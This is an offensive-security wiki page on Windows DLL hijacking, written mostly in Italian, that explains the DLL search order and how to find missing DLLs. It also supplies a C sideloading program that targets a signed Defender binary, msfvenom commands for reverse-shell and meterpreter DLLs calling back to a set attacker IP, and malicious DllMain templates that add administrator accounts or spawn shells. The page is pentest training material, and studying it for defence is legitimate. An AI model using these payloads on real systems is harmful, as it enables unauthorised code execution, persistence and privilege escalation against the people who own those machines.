# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Basic Information

DLL Hijacking consiste nel manipolare un'applicazione affidabile affinché carichi una DLL dannosa. Il termine comprende diverse tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene usato principalmente per code execution, per ottenere persistence e, meno frequentemente, per privilege escalation. Nonostante qui l'attenzione sia sull'escalation, il metodo di hijacking rimane lo stesso a prescindere dall'obiettivo.

### Common Techniques

Diversi metodi vengono impiegati per il DLL hijacking, ciascuno con una efficacia che dipende dalla strategia di loading dei DLL dell'applicazione:

1. **DLL Replacement**: Sostituire una DLL genuina con una maligna, eventualmente usando DLL Proxying per preservare la funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: Inserire la DLL maligna in un percorso di ricerca che viene controllato prima di quello della DLL legittima, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare una DLL maligna che l'applicazione caricherà pensando sia una DLL richiesta ma inesistente.
4. **DLL Redirection**: Modificare i parametri di ricerca come %PATH% o i file .exe.manifest / .exe.local per indirizzare l'applicazione verso la DLL maligna.
5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una controparte maligna nella directory WinSxS, metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: Posizionare la DLL maligna in una directory controllata dall'utente insieme all'applicazione copiata, simile a tecniche di Binary Proxy Execution.

## Finding missing Dlls

Il modo più comune per trovare Dll mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

e mostrare solo la **File System Activity**:

![](<../../images/image (314).png>)

Se stai cercando **dll mancanti in generale** lascia questo in esecuzione per alcuni **secondi**.\
Se stai cercando una **dll mancante all'interno di un eseguibile specifico** dovresti impostare **un altro filtro come "Process Name" "contains" "\<exec name>", eseguirlo, e fermare la cattura degli eventi**.

## Exploiting Missing Dlls

Per poter fare privilege escalation, la nostra migliore opportunità è essere in grado di **scrivere una dll che un processo privilegiato tenterà di caricare** in uno dei **luoghi in cui verrà cercata**. Di conseguenza, saremo in grado di **scrivere** una dll in una **cartella** in cui la **dll viene cercata prima** della cartella contenente la **dll originale** (caso particolare), oppure potremo **scrivere in una cartella in cui la dll verrà cercata** e la dll originale **non esiste** in nessuna cartella.

### Dll Search Order

**Nella** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come i Dll vengono caricati nello specifico.**

Le applicazioni Windows cercano i DLL seguendo una serie di percorsi di ricerca predefiniti, rispettando una particolare sequenza. Il problema del DLL hijacking sorge quando una DLL dannosa viene posizionata strategicamente in una di queste directory, garantendo che venga caricata prima della DLL autentica. Una soluzione per prevenire questo è assicurarsi che l'applicazione usi percorsi assoluti quando fa riferimento alle DLL di cui ha bisogno.

Puoi vedere di seguito l'ordine di ricerca dei DLL sui sistemi a 32-bit:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Questo è l'ordine di ricerca **predefinito** con **SafeDllSearchMode** abilitato. Quando è disabilitato, la current directory sale al secondo posto. Per disabilitare questa feature, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (di default è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH** la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **una dll può essere caricata indicando il percorso assoluto invece del solo nome**. In quel caso quella dll verrà **cercata solo in quel percorso** (se la dll ha dipendenze, esse verranno cercate come se la dll fosse stata caricata per nome).

Esistono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il DLL search path di un nuovo processo creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le API native di ntdll. Fornendo qui una directory controllata dall'attaccante, un processo target che risolve un DLL importato per nome (senza percorso assoluto e senza usare i flag di safe loading) può essere forzato a caricare una DLL maligna da quella directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Esempio d'uso operativo
- Posiziona un xmllite.dll malevolo (esportando le funzioni richieste o fungendo da proxy per quello reale) nella directory DllPath.
- Avvia un binario firmato noto per cercare xmllite.dll per nome utilizzando la tecnica sopra descritta. Il loader risolve l'import tramite il DllPath fornito e sideloads la tua DLL.

Questa tecnica è stata osservata in-the-wild a guidare catene di sideloading multi-stage: un launcher iniziale deposita un helper DLL, che poi esegue un binario firmato da Microsoft e hijackable con un DllPath personalizzato per forzare il caricamento della DLL dell'attaccante da una directory di staging.


#### Eccezioni nell'ordine di ricerca delle DLL dalla documentazione di Windows

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Quando viene incontrata una **DLL che condivide il suo nome con una già caricata in memoria**, il sistema salta la ricerca usuale. Invece, esegue un controllo per la redirezione e un manifest prima di affidarsi alla DLL già in memoria. **In questo scenario, il sistema non esegue una ricerca per la DLL**.
- Nei casi in cui la DLL è riconosciuta come una **known DLL** per la versione di Windows corrente, il sistema utilizzerà la sua versione della known DLL, insieme a qualsiasi DLL dipendente, **saltando il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene la lista di queste known DLL.
- Se una **DLL ha dipendenze**, la ricerca per queste DLL dipendenti viene eseguita come se fossero indicate solo dai loro **module names**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un percorso completo.

### Escalation dei privilegi

**Requisiti**:

- Identificare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale), che **manca di una DLL**.
- Assicurarsi che sia disponibile **accesso in scrittura** per qualsiasi **directory** in cui la **DLL** verrà **cercata**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory inclusa nel path di sistema.

Già, i requisiti sono complicati da trovare dato che **di default è piuttosto raro trovare un eseguibile privilegiato senza una DLL** ed è ancora **più raro avere permessi di scrittura su una cartella del system path** (di solito non puoi). Però, in ambienti malconfigurati questo è possibile.\
Nel caso tu sia fortunato e soddisfi i requisiti, puoi dare un'occhiata al progetto [UACME](https://github.com/hfiref0x/UACME). Anche se l'**obiettivo principale del progetto è bypassare UAC**, potresti trovare lì una **PoC** di un Dll hijaking per la versione di Windows che puoi usare (probabilmente cambiando solo il percorso della cartella dove hai i permessi di scrittura).

Nota che puoi **controllare i tuoi permessi in una cartella** facendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifica i permessi di tutte le cartelle in PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare gli imports di un executable e gli exports di una dll con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abusare Dll Hijacking per scalare i privilegi** avendo i permessi di scrittura in una **cartella del System Path** consulta:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatici

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificherà se hai permessi di scrittura su qualsiasi cartella all'interno del system PATH.\
Altri strumenti automatici interessanti per scoprire questa vulnerabilità sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Nel caso tu trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo è **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. Comunque, nota che Dll Hijacking è utile per [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) o da[ **High Integrity to SYSTEM**](#from-high-integrity-to-system)**.** Puoi trovare un esempio di **how to create a valid dll** all'interno di questo studio su dll hijacking incentrato su dll hijacking per l'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **template** o per creare una **dll con funzioni non richieste esportate**.

## **Creazione e compilazione di Dll**

### **Dll Proxifying**

Fondamentalmente un **Dll proxy** è una Dll in grado di **eseguire il tuo codice malevolo quando viene caricata** ma anche di **esporre** e **funzionare** come previsto inoltrando tutte le chiamate alla libreria reale.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che vuoi proxify e **generare una proxified dll** o **indicare la Dll** e **generare una proxified dll**.

### **Meterpreter**

**Ottieni rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86: non ho visto una versione x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il tuo

Nota che, in diversi casi, la Dll che compili deve **export several functions** che verranno caricate dal victim process; se queste functions non esistono, la **binary won't be able to load** them e l'**exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Riferimenti

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
